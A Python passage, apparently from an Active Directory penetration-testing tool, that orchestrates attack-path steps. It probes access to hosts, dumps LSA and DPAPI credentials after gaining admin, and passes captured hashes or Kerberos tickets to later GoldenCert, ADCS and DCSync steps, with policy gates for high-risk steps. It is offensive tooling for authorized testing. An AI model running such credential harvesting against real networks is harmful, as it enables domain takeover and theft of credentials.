            target_user=target_user,
            target_password=data.get("target_password"),
            user_created_by_us=bool(data.get("user_created_by_us", True)),
            group_candidates=list(data.get("group_candidates") or []),
            non_interactive=True,
        )
        _clear_hassession_cleanup_checkpoint(shell, domain=domain)


def _is_user_domain_admin_via_sid(
    shell: Any,
    *,
    domain: str,
    target_user: str,
    auth_username: str,
    auth_password: str,
) -> bool | None:
    """Verify Domain Admin membership via recursive LDAP SID resolution."""
    try:
        from adscan_internal.cli.ldap import get_recursive_principal_group_sids_in_chain
        from adscan_internal.services.privileged_group_classifier import (
            classify_privileged_membership_from_group_sids,
        )

        group_sids = get_recursive_principal_group_sids_in_chain(
            shell,
            domain=domain,
            target_samaccountname=target_user,
            auth_username=auth_username,
            auth_password=auth_password,
            retries=4,
            retry_delay_seconds=1.0,
            retry_backoff=1.75,
            retry_on_empty=True,
            prefer_kerberos=True,
            allow_ntlm_fallback=True,
        )
        if group_sids is None:
            return None
        if not group_sids:
            return False
        membership = classify_privileged_membership_from_group_sids(group_sids)
        return bool(membership.domain_admin)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        marked_user = mark_sensitive(target_user, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "[hassession] Failed to verify Domain Admin membership for "
            f"{marked_user}@{marked_domain}: {exc}"
        )
        return None


def _find_next_step_by_action(
    steps: list[dict[str, Any]],
    *,
    start_index: int,
    action_key: str,
) -> tuple[int, dict[str, Any]] | None:
    """Return the next step matching ``action_key`` after ``start_index``."""
    needle = str(action_key or "").strip().lower()
    if not needle:
        return None
    for idx in range(start_index + 1, len(steps)):
        step = steps[idx]
        if not isinstance(step, dict):
            continue
        step_action = str(step.get("action") or "").strip().lower()
        if step_action != needle:
            continue
        return idx, step
    return None


def _attempt_post_adminto_credential_harvest(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    current_step_index: int,
    compromised_host_label: str,
    exec_username: str,
    exec_password: str,
    resolved_target_host: str,
) -> None:
    """Try to harvest host creds after AdminTo when a later GoldenCert needs them.

    This is a best-effort optimization for mixed paths such as:
    ``... -> AdminTo -> COMPUTER$ -> GoldenCert -> Domain``.
    """
    if str(
        os.getenv("ADSCAN_ATTACK_PATH_POST_ADMINTO_HARVEST", "1")
    ).strip().lower() not in {
        "1",
        "true",
        "yes",
        "on",
    }:
        return

    next_goldencert = _find_next_step_by_action(
        steps, start_index=current_step_index, action_key="goldencert"
    )
    if not next_goldencert:
        return

    _, golden_step = next_goldencert
    golden_status = str(golden_step.get("status") or "discovered").strip().lower()
    if golden_status == "success":
        return

    details = (
        golden_step.get("details")
        if isinstance(golden_step.get("details"), dict)
        else {}
    )
    golden_from_label = str(details.get("from") or "").strip()
    if not golden_from_label:
        return

    golden_exec_user = _normalize_account(golden_from_label)
    if not golden_exec_user.endswith("$"):
        return

    if _resolve_domain_password(shell, domain, golden_exec_user):
        return

    host_target = resolved_target_host.strip()
    if not host_target:
        host_target = (
            resolve_netexec_target_for_node_label(
                shell, domain, node_label=compromised_host_label
            )
            or ""
        ).strip()
    if not host_target:
        return

    marked_host = mark_sensitive(host_target, "hostname")
    marked_user = mark_sensitive(golden_exec_user, "user")
    print_info(
        "AdminTo verified. Trying opportunistic host credential collection "
        f"on {marked_host} for upcoming GoldenCert ({marked_user})."
    )

    dump_lsa = getattr(shell, "dump_lsa", None)
    if callable(dump_lsa):
        try:
            try:
                dump_lsa(
                    domain,
                    exec_username,
                    exec_password,
                    host_target,
                    "false",
                    include_machine_accounts=True,
                )
            except TypeError:
                # Backward compatibility for test doubles/older shell shims.
                dump_lsa(domain, exec_username, exec_password, host_target, "false")
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(f"[attack_path] Post-AdminTo LSA harvest failed: {exc}")

    if _resolve_domain_password(shell, domain, golden_exec_user):
        marked_user = mark_sensitive(golden_exec_user, "user")
        print_info(
            f"Recovered credential for {marked_user} after AdminTo host collection."
        )
        return

    dump_dpapi = getattr(shell, "dump_dpapi", None)
    if callable(dump_dpapi):
        try:
            dump_dpapi(domain, exec_username, exec_password, host_target, "false")
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(f"[attack_path] Post-AdminTo DPAPI harvest failed: {exc}")

    if _resolve_domain_password(shell, domain, golden_exec_user):
        marked_user = mark_sensitive(golden_exec_user, "user")
        print_info(
            f"Recovered credential for {marked_user} after AdminTo host collection."
        )
        return

    marked_user = mark_sensitive(golden_exec_user, "user")
    print_warning(
        "AdminTo was successful, but no credential was recovered for "
        f"{marked_user}. GoldenCert may fail."
    )


# ---------------------------------------------------------------------------
# Network probe — UX display and stale-snapshot advisory
# ---------------------------------------------------------------------------

_PROBE_STATUS_STYLE: dict[str, tuple[str, str]] = {
    "open": ("[bold green]open[/bold green]", ""),
    "closed": (
        "[bold yellow]closed[/bold yellow]",
        "  [dim]host up · port closed[/dim]",
    ),
    "filtered": ("[bold red]filtered[/bold red]", "  [dim]host offline[/dim]"),
}

_SERVICE_LABEL: dict[str, str] = {
    "smb": "SMB",
    "rdp": "RDP",
    "winrm": "WinRM",
    "mssql": "MSSQL",
    "dcom": "DCOM",
}


def _print_probe_result(result: TCPProbeResult) -> None:
    """Print a compact one-line probe result with tactical styling."""

    status_markup, annotation = _PROBE_STATUS_STYLE.get(
        result.status, (result.status, "")
    )
    get_console().print(
        f"  [dim]◈[/dim]  [cyan]{result.host}[/cyan][dim]:{result.port}[/dim]"
        f"  →  {status_markup}  [dim]{result.elapsed_ms:.0f}ms[/dim]{annotation}"
    )


def _show_stale_snapshot_advisory(
    *,
    target_label: str,
    matched_ips: list[str],
    ports: list[int],
    service_key: str,
) -> None:
    """Show the advisory panel when the vantage catalog marks a host as unreachable."""
    from rich.panel import Panel
    from rich.text import Text as RichText

    ip_str = matched_ips[0] if matched_ips else "—"
    port_str = ", ".join(str(p) for p in ports)
    svc_str = _SERVICE_LABEL.get(service_key, service_key.upper())

    body = (
        f"  Target    [bold]{target_label}[/bold]  [dim]·[/dim]  [dim]{ip_str}[/dim]\n"
        f"  Port      [bold cyan]{port_str}/tcp[/bold cyan]  [dim]({svc_str})[/dim]\n"
        f"  Catalog   [yellow]unreachable[/yellow]  [dim]· snapshot may be outdated[/dim]\n\n"
        "  Workstations get powered off, VMs migrate, firewalls change.\n"
        "  A live probe confirms the current state before discarding this step."
    )
    get_console().print(
        Panel(
            RichText.from_markup(body),
            title="[dim]◈[/dim]  Stale Snapshot — Live Connectivity Check",
            border_style="yellow",
            padding=(0, 2),
        )
    )


def _run_stale_snapshot_probe(
    *,
    target_label: str,
    matched_ips: list[str],
    action: str,
) -> TCPProbeResult | None:
    """
    Advisory flow for a host the catalog marks as unreachable.

    Shows the stale-snapshot panel, asks the operator if they want a fresh
    probe, runs it, and returns:
      - TCPProbeResult if the operator said yes.
      - None if the operator declined or no port is known for this action.
    """
    from rich.prompt import Confirm

    ports = action_to_service_ports(action)
    if not ports:
        return None

    from adscan_internal.services.network_probe_service import ACTION_TO_SERVICE

    service_key = ACTION_TO_SERVICE.get(action.lower().strip(), "")

    target_ip = matched_ips[0] if matched_ips else ""
    if not target_ip:
        return None

    _show_stale_snapshot_advisory(
        target_label=target_label,
        matched_ips=matched_ips,
        ports=ports,
        service_key=service_key,
    )

    try:
        do_probe = Confirm.ask(
            "  [dim]▸[/dim]  Run live connectivity probe?",
            default=True,
            console=get_console(),
        )
    except (EOFError, KeyboardInterrupt):
        do_probe = False

    if not do_probe:
        return None

    result = run_async_sync(tcp_probe_multi(target_ip, ports, timeout=5.0))
    _print_probe_result(result)
    return result


# ---------------------------------------------------------------------------
# Attack-step verification: failure reason taxonomy
# ---------------------------------------------------------------------------


class _VerifyFailReason(str, Enum):
    OK = "ok"
    HOST_OFFLINE = "host_offline"  # network / port unreachable
    SERVICE_DOWN = "service_down"  # host up, but specific service port closed/disabled
    NO_PRIVILEGE = "no_privilege"  # authenticated OK, access denied
    AUTH_FAILED = "auth_failed"  # credentials rejected
    UNKNOWN = "unknown"


_SERVICE_PORTS: dict[str, list[int]] = {
    "smb": [445],
    "rdp": [3389],
    "winrm": [5985, 5986],
    "mssql": [1433],
}


def _map_detail_to_reason(service: str, detail: str) -> _VerifyFailReason:
    """Derive a structured failure reason from the verify_detail tag."""
    d = detail.lower()
    # SMB
    if "smb_status=unreachable" in d or "smb_status=error" in d:
        return _VerifyFailReason.HOST_OFFLINE
    if "smb_status=not_admin" in d:
        return _VerifyFailReason.NO_PRIVILEGE
    if "smb_status=auth_failed" in d:
        return _VerifyFailReason.AUTH_FAILED
    # WinRM
    if "winrm_avail=port_closed" in d:
        return _VerifyFailReason.SERVICE_DOWN
    if "winrm_avail=auth_failed" in d:
        return _VerifyFailReason.AUTH_FAILED
    if "winrm_avail=unknown" in d:
        return _VerifyFailReason.UNKNOWN
    # RDP
    if "rdp_verdict=error" in d:
        return _VerifyFailReason.HOST_OFFLINE
    if "rdp_verdict=false" in d:
        return _VerifyFailReason.NO_PRIVILEGE
    # MSSQL
    if "mssql_no_login" in d:
        return _VerifyFailReason.SERVICE_DOWN
    if "mssql_login_failed" in d:
        return _VerifyFailReason.AUTH_FAILED
    if "mssql_sysadmin=false" in d:
        return _VerifyFailReason.NO_PRIVILEGE
    if "verify_error=" in d:
        return _VerifyFailReason.HOST_OFFLINE
    return _VerifyFailReason.UNKNOWN


def _show_verify_failure_panel(
    *,
    action: str,
    host: str,
    reason: _VerifyFailReason,
    username: str,
) -> None:
    """Display a premium-UX failure panel explaining WHY the verify step failed."""
    from rich.panel import Panel
    from rich.text import Text as RichText

    console = get_console()
    marked_host = mark_sensitive(host, "hostname")
    marked_user = mark_sensitive(username, "user")

    if reason == _VerifyFailReason.HOST_OFFLINE:
        title = f"[bold yellow]{action} — Host Unreachable[/bold yellow]"
        body = (
            f"[bold]{marked_host}[/bold] is not responding on any required protocol port.\n\n"
            "Common causes:\n"
            "  · The machine was [bold]powered off[/bold] (workstation offline, laptop closed)\n"
            "  · Host-based firewall blocking the port from this vantage\n"
            "  · Host disconnected from the network during the engagement\n\n"
            "[dim]The edge is preserved in the graph — not discarded due to a temporary outage.[/dim]\n"
            "[dim]Status updated to:[/dim] [yellow]unavailable[/yellow]"
        )
        border = "yellow"

    elif reason == _VerifyFailReason.SERVICE_DOWN:
        title = f"[bold yellow]{action} — Service Unavailable[/bold yellow]"
        body = (
            f"Host [bold]{marked_host}[/bold] is reachable on the network but the service is closed.\n\n"
            "Common causes:\n"
            "  · Service disabled by GPO or hardening (e.g. WinRM disabled)\n"
            "  · Port filtered by an application-layer firewall\n"
            "  · Service stopped manually during the engagement\n\n"
            "[dim]The edge is preserved — the access may be executable through a different vector.[/dim]\n"
            "[dim]Status updated to:[/dim] [yellow]unavailable[/yellow]"
        )
        border = "yellow"

    elif reason == _VerifyFailReason.NO_PRIVILEGE:
        title = f"[bold red]{action} — Privileges Not Confirmed[/bold red]"
        body = (
            f"[bold]{marked_user}[/bold] authenticated successfully on [bold]{marked_host}[/bold]\n"
            "but [bold]does not hold administrative access[/bold] to the required resource.\n\n"
            "Likely causes:\n"
            "  · Group membership was revoked since the last enumeration\n"
            "  · The graph edge is [bold]stale[/bold] and no longer reflects reality\n"
            "  · The privilege exists but requires prior elevation on the host\n\n"
            "[dim]Status updated to:[/dim] [red]failed[/red]  "
            "[dim]· Edge flagged as failed for manual review.[/dim]"
        )
        border = "red"

    elif reason == _VerifyFailReason.AUTH_FAILED:
        title = f"[bold orange1]{action} — Authentication Failed[/bold orange1]"
        body = (
            f"Credentials for [bold]{marked_user}[/bold] were rejected by [bold]{marked_host}[/bold].\n\n"
            "Most common causes:\n"
            "  · Password or hash rotated since capture\n"
            "  · NTLM blocked by GPO — try a Kerberos ticket instead\n"
            "  · Account locked, disabled, or expired\n\n"
            "[dim]The edge is preserved — this is a credential issue, not a privilege issue.[/dim]\n"
            "[dim]Status updated to:[/dim] [orange1]attempted[/orange1]"
        )
        border = "orange1"

    else:
        title = f"[bold yellow]{action} — Could Not Confirm[/bold yellow]"
        body = (
            f"The native verifier could not conclusively confirm or deny "
            f"[bold]{marked_user}[/bold] against [bold]{marked_host}[/bold].\n\n"
            "Most common causes:\n"
            "  · Kerberos authentication infrastructure was unreachable "
            "(KDC not resolvable from this vantage)\n"
            "  · NTLM is blocked by GPO and no usable Kerberos ticket was available\n"
            "  · The service responded ambiguously (transient error or partial session)\n\n"
            "Suggested next steps:\n"
            "  · Re-run with a valid Kerberos ccache for this principal "
            "([bold]adscan kerberos[/bold])\n"
            "  · Verify KDC reachability from the current vantage\n\n"
            "[dim]Run with[/dim] [bold]--debug[/bold] [dim]for the full transport detail.[/dim]\n"
            "[dim]The edge is preserved — not discarded due to an inconclusive probe.[/dim]\n"
            "[dim]Status updated to:[/dim] [yellow]unavailable[/yellow]"
        )
        border = "yellow"

    console.print(
        Panel(
            RichText.from_markup(body),
            title=title,
            border_style=border,
            padding=(1, 2),
        )
    )


async def _verify_attack_step_native(
    *,
    service: str,
    require_admin: bool,
    domain: str,
    username: str,
    secret: str,
    is_hash: bool,
    target_host: str,
    target_hostname: str | None = None,
    kdc_ip: str | None = None,
    workspace_dir: str | None = None,
) -> tuple[bool, _VerifyFailReason, str]:
    """Native access verifier for AdminTo / SqlAccess / SqlAdmin / CanRDP / CanPSRemote.

    Replaces the legacy ``netexec <service>`` Pwn3d! probe with the
    async native stack: aiosmb (SMB), aardwolf (RDP), winrm async backend
    and impacket TDS via :class:`ImpacketMSSQLBackend` (MSSQL).

    Returns ``(ok, reason, detail)``:
      - ``ok`` is True only when the relation is actively confirmed.
      - ``reason`` is a ``_VerifyFailReason`` classifying WHY it failed.
      - ``detail`` is a short machine-readable tag for debug logs.
    """
    # Pre-flight TCP probe — fail fast (3s) before committing to a full auth attempt
    # that may time out after 15s. Distinguishes host-offline from service-down
    # so the failure panel shows the correct reason without waiting.
    probe_ports = SERVICE_PROBE_PORTS.get(service, [])
    if probe_ports:
        probe = await tcp_probe_multi(target_host, probe_ports, timeout=3.0)
        _print_probe_result(probe)
        if probe.status == "filtered":
            detail = f"{service}_preflight=filtered_port={probe.port}"
            return False, _VerifyFailReason.HOST_OFFLINE, detail
        if probe.status == "closed":
            detail = f"{service}_preflight=closed_port={probe.port}"
            return False, _VerifyFailReason.SERVICE_DOWN, detail
        # "open" → proceed with full auth attempt below

    try:
        if service == "smb":
            result = await verify_domain_user_local_admin(
                domain=domain,
                username=username,
                credential=secret,
                host=target_host,
                target_hostname=target_hostname,
                kdc_ip=kdc_ip,
            )
            detail = f"smb_status={result.status.value}"
            ok = result.status == SMBPrivilegeStatus.ADMIN
            reason = (
                _VerifyFailReason.OK if ok else _map_detail_to_reason(service, detail)
            )
            return ok, reason, detail

        if service == "mssql":
            backend = ImpacketMSSQLBackend(
                host=target_host,
                domain=domain,
                kerberos_target_hostname=target_hostname,
                kdc_host=kdc_ip,
            )
            if require_admin:
                sweep = await asyncio.to_thread(
                    backend.sweep_privileges,
                    domain=domain,
                    username=username,
                    secret=secret,
                )
                if sweep is None:
                    detail = "mssql_no_login"
                    return False, _map_detail_to_reason(service, detail), detail
                detail = f"mssql_sysadmin={sweep.is_sysadmin}"
                ok = bool(sweep.is_sysadmin)
                reason = (
                    _VerifyFailReason.OK
                    if ok
                    else _map_detail_to_reason(service, detail)
                )
                return ok, reason, detail
            identity = await asyncio.to_thread(
                backend.fingerprint_identity,
                domain=domain,
                username=username,
                secret=secret,
            )
            if identity is not None:
                return True, _VerifyFailReason.OK, "mssql_login_ok"
            detail = "mssql_login_failed"
            return False, _map_detail_to_reason(service, detail), detail

        if service == "rdp":
            results = await scan_rdp_hosts(
                [target_host],
                domain=domain,
                username=username,
                secret=secret,
                is_hash=is_hash,
                dc_ip=kdc_ip,
            )
            verdict = results[0].verdict if results else "ERROR"
            detail = f"rdp_verdict={verdict}"
            ok = verdict in ("TRUE", "MAYBE")
            reason = (
                _VerifyFailReason.OK if ok else _map_detail_to_reason(service, detail)
            )
            return ok, reason, detail

        if service == "winrm":
            availability = await probe_winrm_available(
                target_host,
                domain=domain,
                username=username,
                password=secret,
                kerberos_spn_host=target_hostname,
                kdc_ip=kdc_ip,
                workspace_dir=workspace_dir,
            )
            detail = f"winrm_avail={availability}"
            ok = availability == "available"
            reason = (
                _VerifyFailReason.OK if ok else _map_detail_to_reason(service, detail)
            )
            return ok, reason, detail

        detail = f"unsupported_service={service}"
        return False, _VerifyFailReason.UNKNOWN, detail
    except Exception as exc:  # noqa: BLE001 — never propagate to attack-path loop
        telemetry.capture_exception(exc)
        detail = f"verify_error={type(exc).__name__}"
        return False, _VerifyFailReason.HOST_OFFLINE, detail


def execute_selected_attack_path(
    shell: Any,
    domain: str,
    *,
    summary: dict[str, Any],
    context_username: str | None = None,
    context_password: str | None = None,
    search_mode_label: str | None = None,
) -> bool:
    """Execute a selected attack path (best-effort).

    Currently supported step mappings:
    - AllowedToDelegate -> `exploit_delegation_constrained` (native S4U via kerbad)

    Returns:
        True if an execution attempt was started, False otherwise.
    """
    # --- Boundary enforcement: re-apply the readiness gate ---
    # Any caller may pass a raw (un-annotated) summary. We re-annotate here so
    # the reachability and credential gate is evaluated exactly once at the
    # execution boundary, regardless of whether the caller already ran it.
    # This is intentionally idempotent: annotate_summary_execution_readiness
    # returns the same dict if meta is already populated.
    summary = annotate_summary_execution_readiness(
        shell,
        domain=domain,
        summary=summary,
        context_username=context_username,
        context_password=context_password,
    )
    _gate_meta = summary.get("meta") or {}
    _gate_status = str(_gate_meta.get("execution_support_status") or "").strip().lower()
    if _gate_status in {"unsupported", "blocked"}:
        _gate_reason = str(_gate_meta.get("execution_support_reason") or "").strip()
        print_warning(
            "ADscan refuses to execute this attack path: "
            + (_gate_reason or "execution is not supported from the current vantage.")
        )
        _gate_advisory = str(
            _gate_meta.get("execution_target_execution_advisory") or ""
        ).strip()
        if _gate_advisory:
            print_info(_gate_advisory)
        # When the block is due to host unreachability, offer the same pivot
        # follow-up the listing flow offers — a single canonical UX point so
        # any future entry point triggering the gate gets the offer too.
        _gate_viability_status = (
            str(_gate_meta.get("execution_target_viability_status") or "")
            .strip()
            .lower()
        )
        _gate_target_label = str(_gate_meta.get("execution_target_label") or "").strip()
        if _gate_target_label and _gate_viability_status:
            maybe_offer_pivot_opportunity_for_host_viability(
                shell,
                domain=domain,
                blocked_target=_gate_target_label,
                viability_status=_gate_viability_status,
                operator_summary=None,
            )
        return False
    # --- End boundary enforcement ---

    # SSOT physical clock-sync guard: ensure the host clock is fresh-synced to
    # the DC (and host NTP held off) BEFORE any step dispatch. The per-request
    # kerbad clock-skew offset covers AS/TGS, but PKINIT / U2U / shadow-creds
    # chains reached from here need a physically-stepped clock. Idempotent +
    # best-effort: a NOOP within +/-120s, never blocks execution on failure.
    try:
        from adscan_internal.models.domain import resolve_dc_ip
        from adscan_internal.services.dc_time import do_ensure_clock_synced_fresh

        _domain_data = (getattr(shell, "domains_data", {}) or {}).get(domain) or {}
        _clock_dc_ip = resolve_dc_ip(_domain_data)
        if _clock_dc_ip:
            do_ensure_clock_synced_fresh(shell, domain, _clock_dc_ip)
    except Exception:  # noqa: BLE001 — clock guard must never block execution
        pass

    set_attack_path_execution(shell)
    # Surface any HasSession artifact left by a previous crashed run before
    # starting new exploitation — keeps the domain clean and alerts the operator.
    _check_hassession_pending_cleanup(shell, domain=domain)

    local_cleanup_scope_id: str | None = None
    cleanup_scope_owner = False
    try:
        if not has_active_cleanup_scope(shell):
            local_cleanup_scope_id = begin_cleanup_scope(
                shell,
                label="attack_path_execution",
                domain=domain,
            )
            cleanup_scope_owner = True

        is_pivot_search = normalize_search_mode_label(search_mode_label) == "pivot"

        non_executable_actions = CONTEXT_ONLY_RELATIONS
        dangerous_actions = POLICY_BLOCKED_RELATIONS
        supported_actions = SUPPORTED_RELATION_NOTES

        steps = summary.get("steps")

        @contextmanager
        def _active_step_context(
            *,
            action: str,
            from_label: str,
            to_label: str,
            notes: dict[str, object] | None = None,
        ):
            if hasattr(shell, "_set_active_attack_graph_step"):
                shell._set_active_attack_graph_step(  # type: ignore[attr-defined]
                    domain=domain,
                    from_label=from_label,
                    relation=action,
                    to_label=to_label,
                    notes=notes or {},
                )
            try:
                yield
            finally:
                if hasattr(shell, "_clear_active_attack_graph_step"):
                    try:
                        shell._clear_active_attack_graph_step()  # type: ignore[attr-defined]
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

        def _mark_blocked_step(
            action: str,
            from_label: str,
            to_label: str,
            *,
            kind: str,
            reason: str,
        ) -> None:
            if not from_label or not to_label:
                return
            desired_status = "blocked"
            kind_norm = (kind or "").strip().lower()
            if kind_norm == "unavailable":
                desired_status = "unavailable"
            elif kind_norm == "unsupported":
                desired_status = "unsupported"
            try:
                update_edge_status_by_labels(
                    shell,
                    domain,
                    from_label=from_label,
                    relation=action,
                    to_label=to_label,
                    status=desired_status,
                    notes={"blocked_kind": kind, "reason": reason},
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)

        def _halt_path_after_failed_step(
            *,
            action: str,
            from_label: str,
            to_label: str,
            step_index: int,
            executable_step_position: int,
            actor: str | None = None,
        ) -> None:
            """Single source for the universal halt-on-failure of a path step.

            Emits the SAME operator warning and ``path_aborted`` execution event
            for every executing step type once its handler reports a definitive
            failure (the exploit ran and was rejected). The target state the next
            step requires was never established, so the caller MUST ``break`` out
            of the step loop immediately after calling this.

            This is the unified generalization of the halts that previously lived
            only in the generic ACE-step path and the SPNJack point-fix. Only a
            *failed* execution must reach here. Context/membership steps,
            blocked/unavailable pre-execution aborts, and legitimately-skipped
            steps must NOT call this (they keep their own ``continue``/``return``
            for non-failure reasons), so the tri-state distinction
            (success | failed | not_applicable) is preserved structurally by the
            call sites instead of being inferred from persisted edge status.
            """
            marked_action = action
            marked_target = mark_sensitive(to_label or "", "node")
            print_warning(
                f"[dim]Step {executable_step_position}/{total_executable_steps}[/dim] "
                f"[bold]{marked_action}[/bold] on {marked_target} failed — "
                "remaining path steps skipped."
            )
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="path_aborted",
                message=(
                    f"{action} failed on {to_label}; "
                    "subsequent steps require this to succeed and were skipped."
                ),
                step_index=step_index,
                total_steps=total_executable_steps,
                executable_step_index=executable_step_position,
                last_executable_idx=last_executable_idx,
                action=action,
                from_label=from_label,
                to_label=to_label,
                step_status="aborted",
                actor=actor,
            )

        def _handle_failed_adcs_step(
            action: str,
            from_label: str,
            to_label: str,
            *,
            notes: dict[str, Any],
        ) -> None:
            """Mark an ADCS step as failed and surface a warning to the operator."""
            try:
                update_edge_status_by_labels(
                    shell,
                    domain,
                    from_label=from_label,
                    relation=action,
                    to_label=to_label,
                    status="failed",
                    notes=notes,
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
            marked_from = mark_sensitive(from_label, "user")
            marked_to = mark_sensitive(to_label, "user")
            marked_domain = mark_sensitive(domain, "domain")
            print_warning(
                f"Path stopped: {action} did not obtain a certificate for "
                f"{marked_from} → {marked_to} on {marked_domain}. "
                "Downstream steps will not execute."
            )

        def _handle_successful_credential_step(
            action: str,
            from_label: str,
            to_label: str,
            *,
            notes: dict[str, Any],
            captured_principal: str | None = None,
            captured_credential: str | None = None,
            credential_type: str = "nt_hash",
        ) -> None:
            """Single mandatory success path for every credential-producing step.

            Every dispatch branch that authenticates / mints / dumps a new
            principal's credential (ADCS ESC1..ESC15 PKINIT, GoldenCert,
            HasSession create-user, DumpLSA / DumpDPAPI, BackupOperator
            escalation, and the ACE / roasting / spray families) converges
            here on success so the two things that always have to happen,
            happen exactly once:

            1. The edge for ``from_label --action--> to_label`` transitions
               to ``success``. Without this an issued cert / dumped hash would
               leave the edge stuck on ``attempted`` and the attack-path UI
               would show a green chain with one stuck-yellow node.
            2. If a ``captured_principal`` AND a ``captured_credential`` are
               available, that principal's freshly captured credential is
               promoted into the in-path execution context via
               ``_apply_execution_outcome_context_handoff``. Without this the
               next step (e.g. DCSync) would run as the enroller / executor
               instead of the impersonated Domain Admin and fail with
               access-denied / 0 accounts.

            When ``captured_principal`` is given but ``captured_credential`` is
            empty, the credential is resolved from the store (written by
            Pass-the-Certificate / the dump executor during the step). When
            ``captured_principal`` is ``None`` (e.g. ESC13, which only grants a
            group membership and produces no credential), only the edge-status
            transition runs — no handoff.
            """
            try:
                update_edge_status_by_labels(
                    shell,
                    domain,
                    from_label=from_label,
                    relation=action,
                    to_label=to_label,
                    status="success",
                    notes=notes,
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)

            normalized_target = _normalize_account(captured_principal or "")
            if not normalized_target:
                return

            credential = str(captured_credential or "").strip()
            if not credential:
                stored = _get_stored_domain_credential_for_user(
                    shell, domain=domain, username=normalized_target
                )
                credential = str(stored or "").strip()
            if not credential:
                print_info_debug(
                    "[attack_paths] credential step succeeded but no credential "
                    "was available to hand off for the captured principal "
                    f"{mark_sensitive(normalized_target, 'user')}; downstream "
                    "steps will re-resolve from the credential store."
                )
                return

            _apply_execution_outcome_context_handoff(
                {
                    "key": "user_credential_obtained",
                    "compromised_user": normalized_target,
                    "credential": credential,
                    "credential_type": credential_type or "nt_hash",
                    "source_action": action,
                }
            )

        def _handle_successful_adcs_step(
            action: str,
            from_label: str,
            to_label: str,
            *,
            notes: dict[str, Any],
            impersonated_target: str | None = None,
            esc_result: Any | None = None,
        ) -> None:
            """Mark an ADCS ESC step as success and hand off the captured credential.

            Thin wrapper over :func:`_handle_successful_credential_step` kept for
            the ``run_esc_sync``-based ESC handlers (ESC1/2/4/6/7/8/9/11/14/15)
            wired by the prior commit. Behaviour is byte-equivalent: the
            credential value is taken from ``EscResult.nt_hash`` when the native
            runner captured it, otherwise resolved from the credential store by
            the centralised helper.
            """
            captured_credential = ""
            credential_type = "nt_hash"
            if esc_result is not None:
                captured_credential = str(
                    getattr(esc_result, "nt_hash", "") or ""
                ).strip()
                if not captured_credential:
                    # NTLM-disabled / AES-only: no NT hash was recovered, but a
                    # PKINIT TGT (ccache) was obtained and registered in
                    # kerberos_tickets. Hand it off as the credential so the
                    # orchestrator proceeds as the compromised principal;
                    # downstream Kerberos-backed steps (DCSync/DRSUAPI, LDAP, SMB)
                    # select the ccache from kerberos_tickets on their own.
                    ccache = str(getattr(esc_result, "ccache_path", "") or "").strip()
                    if ccache:
                        captured_credential = ccache
                        credential_type = "ccache"
            _handle_successful_credential_step(
                action,
                from_label,
                to_label,
                notes=notes,
                captured_principal=impersonated_target,
                captured_credential=captured_credential or None,
                credential_type=credential_type,
            )

        def _mark_blocked_steps(
            *,
            kinds: dict[str, str],
            kind_label: str,
            default_reason: str,
        ) -> None:
            if not isinstance(steps, list):
                return
            for step_item in steps:
                if not isinstance(step_item, dict):
                    continue
                action = str(step_item.get("action") or "").strip()
                key = action.lower()
                if key not in kinds:
                    continue
                details = (
                    step_item.get("details")
                    if isinstance(step_item.get("details"), dict)
                    else {}
                )
                from_label = str(details.get("from") or "")
                to_label = str(details.get("to") or "")
                _mark_blocked_step(
                    action,
                    from_label,
                    to_label,
                    kind=kind_label,
                    reason=kinds.get(key, default_reason),
                )

        actions: list[str] = []
        if isinstance(steps, list):
            for step in steps:
                if isinstance(step, dict):
                    action = str(step.get("action") or "").strip()
                    if action:
                        actions.append(action)
        unique_actions = sorted({a for a in actions}, key=str.lower)

        blocked = [
            a
            for a in unique_actions
            if classify_relation_support(a).kind == "policy_blocked"
        ]
        unsupported = [
            a
            for a in unique_actions
            if classify_relation_support(a).kind == "unsupported"
        ]

        if blocked:
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="path_blocked",
                message="Attack path execution blocked by policy-protected steps.",
                step_status="blocked",
                reason=", ".join(blocked),
            )
            _mark_blocked_steps(
                kinds={k: v for k, v in dangerous_actions.items()},
                kind_label="dangerous",
                default_reason="High-risk / potentially disruptive",
            )
            table = Table(
                title=Text(
                    "Steps in this path", style=f"bold {BRAND_COLORS['warning']}"
                ),
                show_header=True,
                header_style=f"bold {BRAND_COLORS['warning']}",
                show_lines=True,
            )
            table.add_column("#", style="dim", width=4, justify="right")
            table.add_column("Action", style="bold")
            table.add_column("Executable", style="bold", width=11, justify="center")
            table.add_column("Notes", style="dim", overflow="fold")

            if isinstance(steps, list) and steps:
                for idx, step in enumerate(steps, start=1):
                    action = (
                        str(step.get("action") or "").strip()
                        if isinstance(step, dict)
                        else ""
                    )
                    key = action.lower()
                    if key in supported_actions:
                        executable_label = Text("Yes", style="bold green")
                        notes = supported_actions.get(key, "")
                    elif key in non_executable_actions:
                        executable_label = Text("N/A", style="bold cyan")
                        notes = non_executable_actions.get(key, "")
                    elif key in dangerous_actions:
                        executable_label = Text("No", style="bold yellow")
                        notes = dangerous_actions.get(key, "")
                    else:
                        executable_label = Text("No", style="bold red")
                        notes = "Not implemented yet in ADscan"
                    table.add_row(str(idx), action or "N/A", executable_label, notes)
            else:
                table.add_row(
                    "1", "N/A", Text("No", style="bold red"), "No steps available"
                )

            message = Text()
            message.append(
                "Execution disabled for this attack path.\n\n", style="bold yellow"
            )
            message.append(
                "This path contains high-risk steps that ADscan intentionally does not run automatically.\n",
                style="yellow",
            )
            message.append(
                "You can still inspect the steps and decide if you want to perform them manually.\n",
                style="dim",
            )
            if blocked:
                message.append(
                    f"\nBlocked actions: {', '.join(blocked)}\n",
                    style="dim",
                )

            print_panel(
                [message, table],
                title=Text("Attack Path Execution Disabled", style="bold yellow"),
                border_style="yellow",
                expand=False,
            )
            return False

        if unsupported:
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
